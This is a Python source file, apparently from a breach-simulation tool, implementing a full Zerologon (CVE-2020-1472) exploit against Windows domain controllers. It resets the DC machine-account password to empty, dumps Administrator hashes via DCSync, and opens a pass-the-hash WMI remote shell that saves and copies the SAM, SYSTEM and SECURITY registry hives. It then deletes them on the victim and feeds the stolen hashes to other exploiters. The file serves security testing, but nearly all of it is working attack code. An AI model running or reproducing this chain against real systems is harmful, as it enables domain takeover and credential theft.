"""
Zerologon, CVE-2020-1472
Implementation based on https://github.com/dirkjanm/CVE-2020-1472/ and https://github.com/risksense/zerologon/.
"""

import logging
import os
from binascii import unhexlify
from typing import List, Optional

import impacket
from impacket.dcerpc.v5 import nrpc
from impacket.dcerpc.v5.dtypes import NULL

from common.utils.exploit_enum import ExploitType
from infection_monkey.exploit.HostExploiter import HostExploiter
from infection_monkey.exploit.zerologon_utils.dump_secrets import DumpSecrets
from infection_monkey.exploit.zerologon_utils.options import \
    OptionsForSecretsdump
from infection_monkey.exploit.zerologon_utils.wmiexec import Wmiexec
from infection_monkey.network.zerologon_fingerprint import ZerologonFinger
from infection_monkey.utils.capture_output import StdoutOutputCaptor

LOG = logging.getLogger(__name__)


class ZerologonExploiter(HostExploiter):
    _TARGET_OS_TYPE = ['windows']
    _EXPLOITED_SERVICE = 'Netlogon'
    EXPLOIT_TYPE = ExploitType.VULNERABILITY
    RUNS_AGENT_ON_SUCCESS = False
    MAX_ATTEMPTS = 2000
    ERROR_CODE_ACCESS_DENIED = 0xc0000022

    def __init__(self, host: object):
        super().__init__(host)
        self.vulnerable_port = None
        self.zerologon_finger = ZerologonFinger()
        self.exploit_info['credentials'] = {}

    def _exploit_host(self) -> Optional[bool]:
        self.dc_ip, self.dc_name, self.dc_handle = self.zerologon_finger._get_dc_details(self.host)

        if self.is_exploitable():
            LOG.info("Target vulnerable, changing account password to empty string.")

            # Connect to the DC's Netlogon service.
            try:
                rpc_con = self.zerologon_finger.connect_to_dc(self.dc_ip)
            except Exception as e:
                LOG.info(f"Exception occurred while connecting to DC: {str(e)}")
                return

            # Start exploiting attempts.
            LOG.debug("Attempting exploit.")
            _exploited = self._send_exploit_rpc_login_requests(rpc_con)

            rpc_con.disconnect()

        else:
            LOG.info("Exploit failed. Target is either patched or an unexpected error was encountered.")
            _exploited = False

        # Restore DC's original password.
        if _exploited:
            if self.restore_password():
                LOG.info("System exploited and password restored successfully.")
            else:
                LOG.info("System exploited but couldn't restore password!")
        else:
            LOG.info("System was not exploited.")

        return _exploited

    def is_exploitable(self) -> bool:
        if self.zerologon_finger._SCANNED_SERVICE in self.host.services:
            return self.host.services[self.zerologon_finger._SCANNED_SERVICE]['is_vulnerable']
        return self.zerologon_finger.get_host_fingerprint(self.host)

    def _send_exploit_rpc_login_requests(self, rpc_con) -> Optional[bool]:
        # Max attempts = 2000. Expected average number of attempts needed: 256.
        result_exploit_attempt = None
        for _ in range(0, self.MAX_ATTEMPTS):
            try:
                result_exploit_attempt = self.attempt_exploit(rpc_con)
            except nrpc.DCERPCSessionError as e:
                # Failure should be due to a STATUS_ACCESS_DENIED error.
                # Otherwise, the attack is probably not working.
                if e.get_error_code() != self.ERROR_CODE_ACCESS_DENIED:
                    LOG.info(f"Unexpected error code from DC: {e.get_error_code()}")
            except BaseException as e:
                LOG.info(f"Unexpected error: {e}")

            if result_exploit_attempt is not None:
                if result_exploit_attempt['ErrorCode'] == 0:
                    self.report_login_attempt(result=True, user=self.dc_name)
                    _exploited = True
                    LOG.info("Exploit complete!")
                else:
                    self.report_login_attempt(result=False, user=self.dc_name)
                    _exploited = False
                    LOG.info(f"Non-zero return code: {result_exploit_attempt['ErrorCode']}. Something went wrong.")
                return _exploited

    def attempt_exploit(self, rpc_con: object) -> object:
        request = nrpc.NetrServerPasswordSet2()
        ZerologonExploiter._set_up_request(request, self.dc_name)
        request['PrimaryName'] = self.dc_handle + '\x00'
        request['ClearNewPassword'] = b'\x00' * 516

        return rpc_con.request(request)

    @staticmethod
    def _set_up_request(request: object, dc_name: str) -> None:
        authenticator = nrpc.NETLOGON_AUTHENTICATOR()
        authenticator['Credential'] = b'\x00' * 8
        authenticator['Timestamp'] = b'\x00' * 4

        request['AccountName'] = dc_name + '$\x00'
        request['ComputerName'] = dc_name + '\x00'
        request['SecureChannelType'] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel
        request['Authenticator'] = authenticator

    def restore_password(self) -> Optional[bool]:
        LOG.info("Restoring original password...")

        try:
            # DCSync to get Administrator password's hashes.
            LOG.debug("DCSync; getting Administrator password's hashes.")
            admin_pwd_hashes = self.get_admin_pwd_hashes()
            if not admin_pwd_hashes:
                raise Exception("Couldn't extract Administrator password's hashes.")

            # Use Administrator password's NT hash to get original DC password's hashes.
            LOG.debug("Getting original DC password's NT hash.")
            original_pwd_nthash = self.get_original_pwd_nthash(admin_pwd_hashes)
            if not original_pwd_nthash:
                raise Exception("Couldn't extract original DC password's NT hash.")

            # Connect to the DC's Netlogon service.
            try:
                rpc_con = self.zerologon_finger.connect_to_dc(self.dc_ip)
            except Exception as e:
                LOG.info(f"Exception occurred while connecting to DC: {str(e)}")
                return

            # Start restoration attempts.
            LOG.debug("Attempting password restoration.")
            _restored = self._send_restoration_rpc_login_requests(rpc_con, original_pwd_nthash)
            if not _restored:
                raise Exception("Failed to restore password! Max attempts exceeded?")

            return _restored

        except Exception as e:
            LOG.error(e)

        finally:
            if rpc_con:
                rpc_con.disconnect()

    def get_admin_pwd_hashes(self) -> str:
        try:
            options = OptionsForSecretsdump(
                target=f"{self.dc_name}$@{self.dc_ip}",  # format for DC account - "NetBIOSName$@0.0.0.0"
                target_ip=self.dc_ip,
                dc_ip=self.dc_ip
            )

            dumped_secrets = self.get_dumped_secrets(remote_name=self.dc_ip,
                                                     username=f"{self.dc_name}$",
                                                     options=options)

            user = 'Administrator'
            hashes = ZerologonExploiter._extract_user_hashes_from_secrets(user=user, secrets=dumped_secrets)
            self.store_extracted_hashes_for_exploitation(user=user, hashes=hashes)
            return ':'.join(hashes)  # format - "lmhash:nthash"

        except Exception as e:
            LOG.info(f"Exception occurred while dumping secrets to get Administrator password's NT hash: {str(e)}")

    def get_dumped_secrets(self,
                           remote_name: str = '',
                           username: str = '',
                           options: Optional[object] = None) -> List[str]:
        dumper = DumpSecrets(remote_name=remote_name,
                             username=username,
                             options=options)
        dumped_secrets = dumper.dump().split('\n')
        return dumped_secrets

    @staticmethod
    def _extract_user_hashes_from_secrets(user: str, secrets: List[str]) -> List[str]:
        for secret in secrets:
            if user in secret:
                # format of secret - "domain\uid:rid:lmhash:nthash:::"
                hashes = secret.split(':')[2:4]
                return hashes  # format - [lmhash, nthash]

    def store_extracted_hashes_for_exploitation(self, user: str, hashes: List[str]) -> None:
        self.add_extracted_creds_to_exploit_info(user, hashes[0], hashes[1])
        self.add_extracted_creds_to_monkey_config(user, hashes[0], hashes[1])

    def add_extracted_creds_to_exploit_info(self, user: str, lmhash: str, nthash: str) -> None:
        self.exploit_info['credentials'].update({
            user: {
                'username': user,
                'password': '',
                'lm_hash': lmhash,
                'ntlm_hash': nthash
            }
        })

    # so other exploiters can use these creds
    def add_extracted_creds_to_monkey_config(self, user: str, lmhash: str, nthash: str) -> None:
        if user not in self._config.exploit_user_list:
            self._config.exploit_user_list.append(user)

        if lmhash not in self._config.exploit_lm_hash_list:
            self._config.exploit_lm_hash_list.append(lmhash)

        if nthash not in self._config.exploit_ntlm_hash_list:
            self._config.exploit_ntlm_hash_list.append(nthash)

    def get_original_pwd_nthash(self, admin_pwd_hashes: str) -> str:
        if not self.save_HKLM_keys_locally(admin_pwd_hashes):
            return

        try:
            options = OptionsForSecretsdump(
                dc_ip=self.dc_ip,
                just_dc=False,
                system=os.path.join(os.path.expanduser('~'), 'monkey-system.save'),
                sam=os.path.join(os.path.expanduser('~'), 'monkey-sam.save'),
                security=os.path.join(os.path.expanduser('~'), 'monkey-security.save')
            )

            dumped_secrets = self.get_dumped_secrets(remote_name='LOCAL',
                                                     options=options)
            for secret in dumped_secrets:
                if '$MACHINE.ACC: ' in secret:  # format of secret - "$MACHINE.ACC: lmhash:nthash"
                    nthash = secret.split(':')[2]
                    return nthash

        except Exception as e:
            LOG.info(f"Exception occurred while dumping secrets to get original DC password's NT hash: {str(e)}")

        finally:
            self.remove_locally_saved_HKLM_keys()

    def save_HKLM_keys_locally(self, admin_pwd_hashes: str) -> bool:
        LOG.debug("Starting remote shell on victim.")

        wmiexec = Wmiexec(ip=self.dc_ip,
                          username='Administrator',
                          hashes=admin_pwd_hashes,
                          domain=self.dc_ip)

        remote_shell = wmiexec.get_remote_shell()
        if remote_shell:
            output_captor = StdoutOutputCaptor()
            output_captor.capture_stdout_output()

            try:
                # Save HKLM keys on victim.
                remote_shell.onecmd('reg save HKLM\\SYSTEM system.save && ' +
                                    'reg save HKLM\\SAM sam.save && ' +
                                    'reg save HKLM\\SECURITY security.save')

                # Get HKLM keys locally (can't run these together because it needs to call do_get()).
                remote_shell.onecmd('get system.save')
                remote_shell.onecmd('get sam.save')
                remote_shell.onecmd('get security.save')

                # Delete saved keys on victim.
                remote_shell.onecmd(
                    'del /f system.save sam.save security.save')

                wmiexec.close()

                return True

            except Exception as e:
                LOG.info(f"Exception occured: {str(e)}")

            finally:
                info = output_captor.get_captured_stdout_output()
                LOG.debug(f"Getting victim HKLM keys via remote shell: {info}")

        else:
            raise Exception("Could not start remote shell on DC.")

        return False

    def remove_locally_saved_HKLM_keys(self) -> None:
        for name in ['system', 'sam', 'security']:
            path = os.path.join(os.path.expanduser('~'), f'monkey-{name}.save')
            try:
                os.remove(path)
            except Exception as e:
                LOG.info(f"Exception occurred while removing file {path} from system: {str(e)}")

    def _send_restoration_rpc_login_requests(self, rpc_con, original_pwd_nthash) -> Optional[bool]:
        # Max attempts = 2000. Expected average number of attempts needed: 256.
        result_restoration_attempt = None
        for _ in range(0, self.MAX_ATTEMPTS):
            try:
                result_restoration_attempt = self.attempt_restoration(rpc_con, original_pwd_nthash)
            except nrpc.DCERPCSessionError as e:
                # Failure should be due to a STATUS_ACCESS_DENIED error.
                # Otherwise, the attack is probably not working.
                if e.get_error_code() != self.ERROR_CODE_ACCESS_DENIED:
                    LOG.info(f"Unexpected error code from DC: {e.get_error_code()}")
            except BaseException as e:
                LOG.info(f"Unexpected error: {e}")

            if result_restoration_attempt:
                LOG.debug("DC machine account password should be restored to its original value.")
                return True

    def attempt_restoration(self, rpc_con: object, original_pwd_nthash: str) -> Optional[object]:
        plaintext = b'\x00'*8
        ciphertext = b'\x00'*8
        flags = 0x212fffff

        # Send challenge and authentication request.
        server_challenge_response = nrpc.hNetrServerReqChallenge(rpc_con, self.dc_handle + '\x00',
                                                                 self.dc_name + '\x00', plaintext)
        server_challenge = server_challenge_response['ServerChallenge']

        server_auth = nrpc.hNetrServerAuthenticate3(
            rpc_con, self.dc_handle + '\x00', self.dc_name + '$\x00',
            nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
            self.dc_name + '\x00', ciphertext, flags
        )

        assert server_auth['ErrorCode'] == 0
        session_key = nrpc.ComputeSessionKeyAES(None, b'\x00'*8, server_challenge,
                                                unhexlify("31d6cfe0d16ae931b73c59d7e0c089c0"))

        try:
            nrpc.NetrServerPasswordSetResponse = NetrServerPasswordSetResponse
            nrpc.OPNUMS[6] = (NetrServerPasswordSet,
                              nrpc.NetrServerPasswordSetResponse)

            request = NetrServerPasswordSet()
            ZerologonExploiter._set_up_request(request, self.dc_name)
            request['PrimaryName'] = NULL
            pwd_data = impacket.crypto.SamEncryptNTLMHash(
                unhexlify(original_pwd_nthash), session_key)
            request["UasNewPassword"] = pwd_data

            rpc_con.request(request)

        except Exception as e:
            LOG.info(f"Unexpected error: {e}")

        return rpc_con


class NetrServerPasswordSet(nrpc.NDRCALL):
    opnum = 6
    structure = (
        ('PrimaryName', nrpc.PLOGONSRV_HANDLE),
        ('AccountName', nrpc.WSTR),
        ('SecureChannelType', nrpc.NETLOGON_SECURE_CHANNEL_TYPE),
        ('ComputerName', nrpc.WSTR),
        ('Authenticator', nrpc.NETLOGON_AUTHENTICATOR),
        ('UasNewPassword', nrpc.ENCRYPTED_NT_OWF_PASSWORD),
    )


class NetrServerPasswordSetResponse(nrpc.NDRCALL):
    structure = (
        ('ReturnAuthenticator', nrpc.NETLOGON_AUTHENTICATOR),
        ('ErrorCode', nrpc.NTSTATUS),
    )
